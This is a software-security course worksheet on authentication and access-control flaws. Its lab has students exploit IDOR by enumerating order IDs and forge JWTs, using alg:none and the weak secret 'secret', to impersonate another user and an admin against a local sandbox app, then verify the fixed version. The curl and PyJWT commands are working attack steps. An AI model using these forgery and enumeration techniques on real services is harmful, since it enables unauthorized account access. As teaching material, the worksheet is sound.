# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?
 while authorization answers "What are you allowed to do?" In `get_order`, `current_user()` authenticates the requester, but its result is ignored and there is no check that the requested order belongs to that user. Therefore, authorization is missing.

2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?
IDOR occurs when a user can change an object identifier, such as an order ID, to access another user's object because the server does not check ownership. `/api/orders/<oid>` is vulnerable because it returns the requested order without verifying its owner; `solution_app.py` closes this at L64 by checking `if order["owner"] != user: return 403`.

3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L55) let an attacker submit an *unsigned* token?
The `alg:none` attack changes the JWT algorithm to `"none"`, allowing the attacker to create a token with a modified payload and no signature. Because the vulnerable verifier accepts `"none"` in its allowed algorithms, it accepts the unsigned forged token instead of requiring a valid cryptographic signature.

4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?
 Even if `alg:none` is disabled, the hardcoded secret `"secret"` is guessable, so an attacker who discovers it can modify a JWT and generate a valid signature for the forged token. A strong random secret makes guessing the signing key impractical, while pinning the algorithm to `HS256` prevents the verifier from accepting attacker-selected algorithms such as `"none"`.

5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?
`exp` gives the token an expiration time, preventing it from remaining valid indefinitely, while `aud` identifies the intended audience for the token. The secure version requires both claims so that tokens without a defined lifetime or intended audience are rejected rather than trusted as valid JWTs.

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

**Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

```sim
jwt-forge
```

**Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

**Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Note:* recent PyJWT prints an `InsecureKeyLengthWarning` to **stderr** because `"secret"` is only 6 bytes — that is expected, the token still mints and is accepted.
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

**Task 4 — Privilege escalation to admin via a forged token (25 min) 🔏.**
- *Goal:* read the admin-only flag at `/api/admin` — a page **IDOR cannot reach**: there is no object id to walk, and there is no `admin` account you could log in as (`USERS` has only alice and bob). The only way in is to forge your identity.
- *Steps:* forge a token claiming `sub=admin` (either technique from Task 2/3 works — `alg:none` or the weak `"secret"`), then call `/api/admin`:
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "admin"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED"
  ```
  You should get `FLAG{...}`. Then confirm alice's **real** token gets `403 forbidden` on the same endpoint — proof the server's role check (`if user != "admin"`) is fine; the break is purely that authentication accepted a forged identity.
- *Deliverable:* the forged token + screenshot of the flag + the `403` for alice's real token, and 2–3 sentences: why IDOR can't reach this (horizontal access vs. **vertical** privilege escalation), and why the app's own `if user != "admin"` check didn't save it.

**Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–4.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40). For Task 4, `/api/admin` with a forged `sub=admin` token → **401** — the *same* `current_user()` fix (L50) rejects the forgery before the role check runs, so one fix closes every endpoint; alice's real token still gets **403** there (she isn't admin).
- *Deliverable:* screenshots of the 403 and the 401s (orders **and** `/api/admin`) + name the fix line for each.

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.
2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*
3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** ____________________
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
  2. **Why does your fix actually stop it** — and what could still break it?

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.
2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*
